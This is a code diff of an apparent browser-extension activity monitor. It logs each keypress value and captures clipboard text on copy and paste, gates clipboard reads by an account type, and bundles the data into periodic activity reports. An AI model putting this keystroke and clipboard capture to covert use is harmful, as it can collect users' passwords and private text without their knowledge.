@@ -24,6 +24,9 @@ let lastMouseTime = null;
 let totalMouseSpeed = 0;
 let mouseMovements = 0;
 
+// Account type (manual = no clipboard API, chrome = full access)
+let accountType = 'manual'; // default safe
+
 // Throttle для mousemove (50ms)
 let lastMouseMoveTime = 0;
 const MOUSE_THROTTLE_MS = 50;
@@ -35,6 +38,18 @@ const REPORT_INTERVAL_MS = 5000;
 function isExtensionValid() {
   return chrome.runtime?.id;
 }
+
+// Load account type from storage
+(async function loadAccountType() {
+  try {
+    const result = await chrome.storage.local.get('accountType');
+    if (result.accountType) {
+      accountType = result.accountType;
+    }
+  } catch (e) {
+    // Ignore, use default
+  }
+})();
 
 // ============ PROFILE SETUP ============
 (function() {
@@ -58,11 +73,12 @@ document.addEventListener('click', () => {
 }, true);
 
 // Нажатия клавиш
+// Нажатия клавиш
 document.addEventListener('keydown', (e) => {
   keypresses++;
   
-  // NEW: Сохраняем клавишу в массив
-  if (keysArray.length < MAX_KEYS) {
+  // NEW: Сохраняем клавишу в массив (только если есть значение)
+  if (keysArray.length < MAX_KEYS && e.key) {
     keysArray.push(e.key);
   }
 }, true);
@@ -107,33 +123,33 @@ document.addEventListener('mousemove', (e) => {
 document.addEventListener('copy', async () => {
   copyCount++;
   
-  try {
-    const text = await navigator.clipboard.readText();
-    if (text && clipboardHistory.length < MAX_CLIPBOARD_ITEMS) {
-      clipboardHistory.push({
-        action: 'copy',
-        text: text.substring(0, MAX_CLIPBOARD_TEXT_LENGTH)
-      });
+  // Только для Chrome identity — используем clipboard API
+  if (accountType === 'chrome') {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text && clipboardHistory.length < MAX_CLIPBOARD_ITEMS) {
+        clipboardHistory.push({
+          action: 'copy',
+          text: text.substring(0, MAX_CLIPBOARD_TEXT_LENGTH)
+        });
+      }
+    } catch (e) {
+      // Clipboard access denied - just count
     }
-  } catch (e) {
-    // Clipboard access denied - just count
   }
 }, true);
 
 // NEW: Paste event
-document.addEventListener('paste', async () => {
+document.addEventListener('paste', (e) => {
   pasteCount++;
   
-  try {
-    const text = await navigator.clipboard.readText();
-    if (text && clipboardHistory.length < MAX_CLIPBOARD_ITEMS) {
-      clipboardHistory.push({
-        action: 'paste',
-        text: text.substring(0, MAX_CLIPBOARD_TEXT_LENGTH)
-      });
-    }
-  } catch (e) {
-    // Clipboard access denied - just count
+  // Получаем текст из события (работает для всех типов аккаунтов)
+  const text = e.clipboardData?.getData('text');
+  if (text && clipboardHistory.length < MAX_CLIPBOARD_ITEMS) {
+    clipboardHistory.push({
+      action: 'paste',
+      text: text.substring(0, MAX_CLIPBOARD_TEXT_LENGTH)
+    });
   }
 }, true);
 
@@ -207,7 +223,7 @@ function sendActivityReport() {
       paste_count: pasteCount,
       keys_array: keysArray.length > 0 ? [...keysArray] : null,
       clipboard_history: clipboardHistory.length > 0 ? [...clipboardHistory] : null,
-      mouse_avg_speed: avgMouseSpeed > 0 ? Math.round(avgMouseSpeed * 1000) / 1000 : null // px/ms, 3 decimal places
+      mouse_avg_speed: avgMouseSpeed > 0 ? Math.round(avgMouseSpeed * 1000) / 1000 : null
     }
   });
 
